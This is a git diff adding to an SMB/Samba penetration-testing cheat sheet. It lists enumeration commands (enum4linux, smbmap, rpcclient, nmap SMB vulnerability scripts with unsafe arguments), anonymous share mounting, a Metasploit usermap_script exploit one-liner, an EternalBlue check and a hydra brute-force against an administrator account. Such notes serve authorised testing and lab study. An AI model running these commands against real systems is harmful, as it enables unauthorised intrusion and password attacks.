@@ -1,4 +1,91 @@
-* enum4linux -a IP
+***SMB and SAMBA***
+> Server Message Block (SMB) Protocol is a network file sharing protocol, and as implemented in Microsoft Windows
+> Samba has provided secure, stable and fast file and print services for all clients using the SMB/CIFS protocol, such as all versions of DOS and Windows, OS/2, Linux and many others
+
+***SMB uses the following TCP and UDP ports:***
+netbios-ns 137/tcp # NETBIOS Name Service
+netbios-ns 137/udp
+netbios-dgm 138/tcp # NETBIOS Datagram Service
+netbios-dgm 138/udp
+netbios-ssn 139/tcp # NETBIOS session service
+netbios-ssn 139/udp
+microsoft-ds 445/tcp # if you are using Active Directory
+
+
+***Enumeration***
+> nmblookup — NetBIOS over TCP/IP client used to lookup NetBIOS names
+
+* nmblookup -A $ip
+* enum4linux -a $ip
+
+> Used to enumerate data from Windows and Samba hosts and is a wrapper for smbclient, rpcclient, net and nmblookup
+> Look for users, groups, shares, workgroup/domains and password policies
+
+> list smb nmap scripts
+
+* locate .nse | grep smb
+
+***find SAMBA version number using the SMB OS discovery script:***
+* nmap -A $ip -p139
+> then google to see if version is vulnerable
+  > SAMBA 3.x-4.x #  vulnerable to linux/samba/is_known_pipename
+  > SAMBA 3.5.11 # vulnerable to linux/samba/is_known_pipename
+
+***smbmap***
+* smbmap -H $ip
+* smbmap -R $sharename -H $ip #Recursively list dirs, and files
+* smbmap -R $sharename -H $ip -A $fileyouwanttodownload -q #downloads a file in quiet mode
+> downloads to the /usr/share/smbmap directory
+> generally works a bit better than enum4linux as it enum4linux tends to error out a bit
+> Ippsec using this tool - https://www.youtube.com/watch?v=jUc1J31DNdw&t=445s
+
+***Null Session***
+> A null SMB session can be used to gather passwords and useful information from SMB 1 by looking in shares that are not password protected for interesting files. Windows NT/2000 XP default settings allow this. Windows 2003/XP SP2 SMB this behaviour is disabled.
+
+> Null session and extract information.
+* nbtscan -r $ip
+
+> Version
+* msfconsole; use auxiliary/scanner/smb/smb_version; set RHOSTS $ip; run
+
+> MultiExploit
+* msfconsole; use exploit/multi/samba/usermap_script; set lhost 10.10.14.x; set rhost $ip; run
+
+> Show all nmap SMB scripts
+* ls -ls /usr/share/nmap/scripts/smb*
+
+> Quick enum:
+* nmap --script=smb-enum* --script-args=unsafe=1 -T5 $ip
+
+> Quick vuln scan:
+* nmap --script=smb-vuln* --script-args=unsafe=1 -T5 $ip
+
+> Full enum and vuln scanning:
+* nmap --script=smb2-capabilities,smb-print-text,smb2-security-mode.nse,smb-protocols,smb2-time.nse,smb-psexec,smb2-vuln-uptime,smb-security-mode,smb-server-stats,smb-double-pulsar-backdoor,smb-system-info,smb-vuln-conficker,smb-enum-groups,smb-vuln-cve2009-3103,smb-enum-processes,smb-vuln-cve-2017-7494,smb-vuln-ms06-025,smb-enum-shares,smb-vuln-ms07-029,smb-enum-users,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-ls,smb-vuln-ms10-061,smb-vuln-ms17-010,smb-os-discovery --script-args=unsafe=1 -T5 $ip
+
+> Full enum & vuln scan:
+* nmap -p139,445 -T4 -oN smb_vulns.txt -Pn --script 'not brute and not dos and smb-*' -vv -d $ip
+
+> Mount:
+* smbclient //$ip/share -U username
+
+> Anonymous mount:
+* smbclient //$ip/share # hit enter with blank password
+
+**Eternal Blue**
+>Exploits a critical vulnerability in the SMBv1 protocol
+>Worth testing Eternal blue - you might get lucky although (the system should be patched to fix this)
+>Vulnerable versions - Windows 7, 8, 8.1 and Windows Server 2003/2008/2012(R2)/2016
+* nmap -p 445 $ip --script=smb-vuln-ms17-010
+
+> Bruteforce
+* hydra -l administrator -P /usr/share/wordlists/rockyou.txt -t 1 $ip smb
+
+>Any metasploit exploit through Netbios over TCP in 139, you need to set:
+* set SMBDirect false
+
+*************
+
 * smbclient -L //IP
 * smbclient -L //192.168.1.2/myshare -U anonymous
 * rpcclient -U “” 192.168.1.2    ///when asked enter empty password
@@ -9,6 +96,7 @@
 * rpcclient $>getdompwinfo   //password policy
 * rpcclient $>netshareenum
 
-* nmblookup -A 192.168.1.1
 * nbtscan IP
 * nmap IP -p 139,445 –script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse
+
+**************
